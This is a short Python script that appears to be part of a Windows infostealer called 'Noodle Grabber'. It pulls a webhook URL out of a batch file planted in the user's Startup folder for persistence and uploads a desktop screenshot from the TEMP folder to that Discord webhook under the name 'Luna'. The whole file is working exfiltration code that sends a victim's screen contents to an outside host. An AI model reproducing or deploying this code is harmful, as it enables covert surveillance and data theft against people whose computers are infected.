import requests
from requests_toolbelt import MultipartEncoder
import json
import os

def get_inf(webhook):
    temp_directory = os.environ.get('TEMP')
    image_path = os.path.join(temp_directory, "image.png")

    webhook_data = {
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
        "embeds": [
            {
                "color": 5639644,
                "title": "Desktop Screenshot",
                "image": {
                    "url": "attachment://image.png"
                }
            }
        ]
    }

    with open(image_path, "rb") as f:
        image_data = f.read()
        encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

    headers = {'Content-Type': encoder.content_type}
    response = requests.post(webhook, headers=headers, data=encoder.to_string())

def get_webhook_from_file():
    startup_folder = os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    batch_file_path = os.path.join(startup_folder, "Noodle_Grabber_6.bat")

    if os.path.exists(batch_file_path):
        with open(batch_file_path, "r") as file:
            for line in file:
                if line.startswith('set "webhookUrl='):
                    webhook_url = line[len('set "webhookUrl='):].strip().strip('"')
                    return webhook_url

    return None

webhook_url = get_webhook_from_file()

if webhook_url:
    get_inf(webhook_url)
else:
    print("Webhook URL not found in the batch file.")